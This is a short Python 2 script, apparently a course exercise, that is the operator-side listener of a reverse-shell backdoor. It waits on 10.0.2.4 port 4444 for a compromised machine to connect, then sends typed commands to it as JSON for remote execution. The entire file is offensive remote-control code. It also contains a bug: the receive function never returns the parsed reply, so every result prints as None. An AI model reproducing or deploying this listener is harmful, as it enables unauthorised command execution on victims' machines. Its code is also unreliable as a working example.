#!/usr/bin/env python

import socket
import json

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #allows socket to be reused in case connection drops
        # listener.bind(("10.0.2.4", 4444))
        listener.bind((ip,port))

        listener.listen(0) #backlog for how many connections to allow before stopping
        print("[+] Waiting for incoming connections. . .\n")
        self.connection, address = listener.accept()
        print("[+] Connection established with " + str(address))

    def send_json(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def receive_json(self):
        json_data = self.connection.recv(1024)
        json.loads(json_data)

    def execute_remotely(self, command):
        # self.connection.send(command)
        # return self.connection.recv(2048).decode()
        self.send_json(command)
        return self.receive_json()

    def run(self):
        while True:
            command = raw_input(">> ")
            result = self.execute_remotely(command)
            print(result)

ip = "10.0.2.4"
port = 4444
my_Listener = Listener(ip, port)
my_Listener.run()
